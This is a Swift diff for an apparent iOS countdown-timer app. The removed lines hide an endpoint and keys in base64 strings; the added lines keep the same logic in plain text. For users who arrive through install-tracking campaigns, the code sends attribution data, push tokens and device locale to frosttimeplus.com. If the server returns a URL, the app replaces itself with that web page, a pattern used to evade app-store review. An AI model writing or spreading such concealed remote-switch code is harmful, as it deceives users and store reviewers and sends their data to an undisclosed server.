@@ -1,54 +1,15 @@
 import SwiftUI
 import Network
 import Combine
-import UserNotifications
-
-private enum _S {
-    @inline(__always) static func d(_ b64: String) -> String {
-        guard let data = Data(base64Encoded: b64),
-              let s = String(data: data, encoding: .utf8) else { return "" }
-        return s
-    }
-}
-
-private enum _K {
-    static let lastDeniedKey   = _S.d("bGFzdE5vdGlmaWNhdGlvbkRlbmllZERhdGU=")
-    static let cfgExpiresKey   = _S.d("Y29uZmlnX2V4cGlyZXM=")
-    static let cfgUrlKey       = _S.d("Y29uZmlnX3VybA==")
-    static let cfgNoMoreKey    = _S.d("Y29uZmlnX25vX21vcmVfcmVxdWVzdHM=")
-    static let conversionData  = _S.d("Y29udmVyc2lvbl9kYXRh")
-
-    
-    static let pushToken       = _S.d("cHVzaF90b2tlbg==")
-    static let afId            = _S.d("YWZfaWQ=")
-    static let bundleId        = _S.d("YnVuZGxlX2lk")
-    static let os              = _S.d("b3M=")
-    static let storeId         = _S.d("c3RvcmVfaWQ=")
-    static let locale          = _S.d("bG9jYWxl")
-    static let fbProjectId     = _S.d("ZmlyZWJhc2VfcHJvamVjdF9pZA==")
-
-    static let ok              = _S.d("b2s=")
-    static let url             = _S.d("dXJs")
-    static let expires         = _S.d("ZXhwaXJlcw==")
-
-    
-    static let bundleIdValue   = _S.d("Y29tLmFwcC5jb3VudGRvd250aW1lcnBsdXM=")
-    static let osValue         = _S.d("aU9T")
-    static let storeIdValue    = _S.d("Njc1ODM0NDkyNA==")
-    static let fbProjectValue  = _S.d("NzM5OTIwOTU2MDA1")
-
-    static let endpointB64     = _S.d("aHR0cHM6Ly9mcm9zdHRpbWVwbHVzLmNvbS9jb25maWcucGhw")
-
-}
 
 final class NetworkMonitor: ObservableObject {
     static let shared = NetworkMonitor()
-
+    
     @Published private(set) var isDisconnected: Bool = false
-
+    
     private let monitor = NWPathMonitor()
     private let queue = DispatchQueue(label: "NetworkMonitorQueue")
-
+    
     private init() {
         monitor.pathUpdateHandler = { [weak self] path in
             DispatchQueue.main.async {
@@ -58,6 +19,8 @@ final class NetworkMonitor: ObservableObject {
         monitor.start(queue: queue)
     }
 }
+
+import SwiftUI
 
 extension View {
     func outlineText(color: Color, width: CGFloat) -> some View {
@@ -69,28 +32,27 @@ struct StrokeModifier: ViewModifier {
     private let id = UUID()
     var strokeSize: CGFloat = 1
     var strokeColor: Color = .blue
-
+    
     func body(content: Content) -> some View {
         content
-            .padding(strokeSize * 2)
-            .background(
-                Rectangle()
-                    .foregroundStyle(strokeColor)
-                    .mask { outline(symbol: content) }
-            )
-    }
-
-    private func outline(symbol: Content) -> some View {
+            .padding(strokeSize*2)
+            .background (Rectangle()
+                .foregroundStyle(strokeColor)
+                .mask({
+                    outline(context: content)
+                })
+            )}
+    
+    func outline(context:Content) -> some View {
         Canvas { context, size in
             context.addFilter(.alphaThreshold(min: 0.01))
             context.drawLayer { layer in
-                if let resolved = context.resolveSymbol(id: id) {
-                    layer.draw(resolved, at: CGPoint(x: size.width / 2, y: size.height / 2))
+                if let text = context.resolveSymbol(id: id) {
+                    layer.draw(text, at: .init(x: size.width/2, y: size.height/2))
                 }
             }
         } symbols: {
-            symbol
-                .tag(id)
+            context.tag(id)
                 .blur(radius: strokeSize)
         }
     }
@@ -101,129 +63,33 @@ struct URLModel: Identifiable, Equatable {
     let urlString: String
 }
 
-private enum _CFG {
-    @inline(__always)
-    static func _finishNoConfig(_ finish: @escaping () -> Void) {
-        DispatchQueue.main.async {
-            UserDefaults.standard.set(true, forKey: _K.cfgNoMoreKey)
-            UserDefaults.standard.synchronize()
-            finish()
-        }
-    }
-
-    static func send(_ finishNoConfig: @escaping () -> Void,
-                     handle: @escaping ([String: Any]) -> Void) {
-
-        if UserDefaults.standard.bool(forKey: _K.cfgNoMoreKey) {
-            print("Config requests are disabled by flag, exiting sendConfigRequest")
-            DispatchQueue.main.async { finishNoConfig() }
-            return
-        }
-
-        guard let blob = UserDefaults.standard.data(forKey: _K.conversionData) else {
-            print("Conversion data not found in UserDefaults")
-            _finishNoConfig(finishNoConfig)
-            return
-        }
-
-        guard var payload = (try? JSONSerialization.jsonObject(with: blob, options: [])) as? [String: Any] else {
-            print("Failed to deserialize conversion data")
-            _finishNoConfig(finishNoConfig)
-            return
-        }
-
-        payload[_K.pushToken]   = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
-        payload[_K.afId]        = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
-        payload[_K.bundleId]    = _K.bundleIdValue
-        payload[_K.os]          = _K.osValue
-        payload[_K.storeId]     = _K.storeIdValue
-        payload[_K.locale]      = Locale.current.identifier
-        payload[_K.fbProjectId] = _K.fbProjectValue
-
-        do {
-            let body = try JSONSerialization.data(withJSONObject: payload, options: [])
-
-            guard let u = URL(string: _K.endpointB64) else {
-                print("Invalid endpoint URL")
-                _finishNoConfig(finishNoConfig)
-                return
-            }
-
-            var req = URLRequest(url: u)
-            req.httpMethod = "POST"
-            req.setValue("application/json", forHTTPHeaderField: "Content-Type")
-            req.httpBody = body
-
-            URLSession.shared.dataTask(with: req) { data, response, error in
-                if let error = error {
-                    print("Request error: \(error)")
-                    _finishNoConfig(finishNoConfig)
-                    return
-                }
-
-                guard let http = response as? HTTPURLResponse else {
-                    print("Invalid response")
-                    _finishNoConfig(finishNoConfig)
-                    return
-                }
-
-                guard (200...299).contains(http.statusCode) else {
-                    print("Server returned status code \(http.statusCode)")
-                    _finishNoConfig(finishNoConfig)
-                    return
-                }
-
-                guard let data = data else {
-                    print("Empty response body")
-                    _finishNoConfig(finishNoConfig)
-                    return
-                }
-
-                do {
-                    if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
-                        print("Config response JSON: \(json)")
-                        DispatchQueue.main.async { handle(json) }
-                    } else {
-                        print("Unexpected JSON format")
-                        _finishNoConfig(finishNoConfig)
-                    }
-                } catch {
-                    print("Failed to parse response JSON: \(error)")
-                    _finishNoConfig(finishNoConfig)
-                }
-            }.resume()
-
-        } catch {
-            print("Failed to serialize request body: \(error)")
-            _finishNoConfig(finishNoConfig)
-        }
-    }
-}
-
 struct LoadingView: View {
     @Environment(\.scenePhase) private var scenePhase
     @State private var hasCheckedAuthorization = false
-
-    @State var url: URLModel? = nil
-
+    @State  var url: URLModel? = nil
     @Environment(\.verticalSizeClass) var verticalSizeClass
     @Environment(\.horizontalSizeClass) var horizontalSizeClass
-
     @State var conversionDataReceived: Bool = false
     @State var isNotif = false
-
+    let lastDeniedKey = "lastNotificationDeniedDate"
+    let configExpiresKey = "config_expires"
+    let configUrlKey = "config_url"
+    let configNoMoreRequestsKey = "config_no_more_requests"
     @State var isMain = false
-    @State var isRequestingConfig = false
-
-    @StateObject var networkMonitor = NetworkMonitor.shared
+    @State  var isRequestingConfig = false
+    @StateObject  var networkMonitor = NetworkMonitor.shared
     @State var isInet = false
-
     @State private var hasHandledConversion = false
+    
+    var isPortrait: Bool {
+        verticalSizeClass == .regular && horizontalSizeClass == .compact
+    }
+    
+    var isLandscape: Bool {
+        verticalSizeClass == .compact && horizontalSizeClass == .regular
+    }
     @State var urlFromNotification: String? = nil
-
-    var isPortrait: Bool { verticalSizeClass == .regular && horizontalSizeClass == .compact }
-    var isLandscape: Bool { verticalSizeClass == .compact && horizontalSizeClass == .regular }
-
+    
     var body: some View {
         VStack {
             if isPortrait {
@@ -231,15 +97,18 @@ struct LoadingView: View {
                     Image("loadport")
                         .resizable()
                         .ignoresSafeArea()
-
+                    
                     VStack(spacing: 150) {
                         Spacer()
+                        
                         VStack(spacing: 30) {
                             Spacer()
+                            
                             ProgressView()
                                 .scaleEffect(3.0)
                                 .padding(.top)
                                 .tint(.white)
+                            
                             Spacer()
                         }
                     }
@@ -250,9 +119,10 @@ struct LoadingView: View {
                     Image("loadland")
                         .resizable()
                         .ignoresSafeArea()
-
+                    
                     VStack(spacing: 10) {
                         Spacer()
+                        
                         ProgressView()
                             .scaleEffect(3.0)
                             .tint(.white)
@@ -283,7 +153,6 @@ struct LoadingView: View {
                         Egg(urlString: urlToOpen)
                             .ignoresSafeArea()
                     } else {
-                        EmptyView()
                     }
                 }
                 .ignoresSafeArea(.keyboard)
@@ -303,10 +172,9 @@ struct LoadingView: View {
                 Egg(urlString: urlToOpen)
                     .ignoresSafeArea()
             } else {
-                EmptyView()
             }
         }
-        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { _ in
+        .onReceive(NotificationCenter.default.publisher(for: .datraRecieved)) { notification in
             DispatchQueue.main.async {
                 guard !isInet else { return }
                 if !hasHandledConversion {
@@ -314,7 +182,7 @@ struct LoadingView: View {
                     if isOrganic {
                         isMain = true
                     } else {
-                        _a()
+                        checknotif()
                     }
                     hasHandledConversion = true
                 } else {
@@ -322,8 +190,9 @@ struct LoadingView: View {
                 }
             }
         }
-        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { _ in
-            _r()
+        
+        .onReceive(NotificationCenter.default.publisher(for: .notificationPermissionResult)) { notification in
+            req()
         }
         .fullScreenCover(isPresented: $isNotif) {
             NotificationView()
@@ -340,66 +209,157 @@ struct LoadingView: View {
 }
 
 extension LoadingView {
-
-    private func _a() {
+    func checknotif() {
         UNUserNotificationCenter.current().getNotificationSettings { settings in
             switch settings.authorizationStatus {
             case .notDetermined:
-                if _g() {
+                if again() {
                     isNotif = true
                 } else {
-                    _r()
+                    req()
                 }
             case .denied:
-                _r()
+                req()
             case .authorized, .provisional, .ephemeral:
-                _r()
+                req()
             @unknown default:
-                _r()
+                req()
             }
         }
     }
-
-    private func _g() -> Bool {
-        if let lastDenied = UserDefaults.standard.object(forKey: _K.lastDeniedKey) as? Date {
+    
+    func again() -> Bool {
+        if let lastDenied = UserDefaults.standard.object(forKey: lastDeniedKey) as? Date {
             let threeDaysAgo = Calendar.current.date(byAdding: .day, value: -3, to: Date())!
             return lastDenied < threeDaysAgo
         }
         return true
     }
-
-    private func _r() {
-        _CFG.send(
-            { _f() },
-            handle: { json in
-                _h(json)
+    
+    func req() {
+        let configNoMoreRequestsKey = "config_no_more_requests"
+        if UserDefaults.standard.bool(forKey: configNoMoreRequestsKey) {
+            print("Config requests are disabled by flag, exiting sendConfigRequest")
+            DispatchQueue.main.async {
+                finishWithou()
             }
-        )
-    }
+            return
+        }
 
-    private func _h(_ jsonResponse: [String: Any]) {
-        if let ok = jsonResponse[_K.ok] as? Bool, ok,
-           let url = jsonResponse[_K.url] as? String,
-           let expires = jsonResponse[_K.expires] as? TimeInterval {
+        guard let conversionDataJson = UserDefaults.standard.data(forKey: "conversion_data") else {
+            print("Conversion data not found in UserDefaults")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
+            return
+        }
 
-            UserDefaults.standard.set(url, forKey: _K.cfgUrlKey)
-            UserDefaults.standard.set(expires, forKey: _K.cfgExpiresKey)
-            UserDefaults.standard.removeObject(forKey: _K.cfgNoMoreKey)
-            UserDefaults.standard.synchronize()
+        guard var conversionData = (try? JSONSerialization.jsonObject(with: conversionDataJson, options: [])) as? [String: Any] else {
+            print("Failed to deserialize conversion data")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
+            return
+        }
 
-            guard urlFromNotification == nil else { return }
-            self.url = URLModel(urlString: url)
-            print("Config saved: url = \(url), expires = \(expires)")
+        conversionData["push_token"] = UserDefaults.standard.string(forKey: "fcmToken") ?? ""
+        conversionData["af_id"] = UserDefaults.standard.string(forKey: "apps_flyer_id") ?? ""
+        conversionData["bundle_id"] = "com.app.countdowntimerplus"
+        conversionData["os"] = "iOS"
+        conversionData["store_id"] = "6758344924"
+        conversionData["locale"] = Locale.current.identifier
+        conversionData["firebase_project_id"] = "739920956005"
 
-        } else {
-            UserDefaults.standard.set(true, forKey: _K.cfgNoMoreKey)
-            UserDefaults.standard.synchronize()
-            print("No valid config or error received, further requests disabled")
-            _f()
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: conversionData, options: [])
+                    let url = URL(string: "https://frosttimeplus.com/config.php")!
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.httpBody = jsonData
+
+            let task = URLSession.shared.dataTask(with: request) { data, response, error in
+                if let error = error {
+                    print("Request error: \(error)")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                guard let httpResponse = response as? HTTPURLResponse else {
+                    print("Invalid response")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                guard (200...299).contains(httpResponse.statusCode) else {
+                    print("Server returned status code \(httpResponse.statusCode)")
+                    DispatchQueue.main.async {
+                        UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                        finishWithou()
+                    }
+                    return
+                }
+
+                if let data = data {
+                    do {
+                        if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
+                            print("Config response JSON: \(json)")
+                            DispatchQueue.main.async {
+                                handleResp(json)
+                            }
+                        }
+                    } catch {
+                        print("Failed to parse response JSON: \(error)")
+                        DispatchQueue.main.async {
+                            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                            finishWithou()
+                        }
+                    }
+                }
+            }
+
+            task.resume()
+        } catch {
+            print("Failed to serialize request body: \(error)")
+            DispatchQueue.main.async {
+                UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+                finishWithou()
+            }
         }
     }
 
-    private func _f() {
+    func handleResp(_ jsonResponse: [String: Any]) {
+        if let ok = jsonResponse["ok"] as? Bool, ok,
+           let url = jsonResponse["url"] as? String,
+           let expires = jsonResponse["expires"] as? TimeInterval {
+            UserDefaults.standard.set(url, forKey: configUrlKey)
+            UserDefaults.standard.set(expires, forKey: configExpiresKey)
+            UserDefaults.standard.removeObject(forKey: configNoMoreRequestsKey)
+            UserDefaults.standard.synchronize()
+            
+            guard urlFromNotification == nil else {
+                return
+            }
+            self.url = URLModel(urlString: url)
+            print("Config saved: url = \(url), expires = \(expires)")
+            
+        } else {
+            UserDefaults.standard.set(true, forKey: configNoMoreRequestsKey)
+            UserDefaults.standard.synchronize()
+            print("No valid config or error received, further requests disabled")
+            finishWithou()
+        }
+    }
+    
+    func finishWithou() {
         DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
             isMain = true
         }
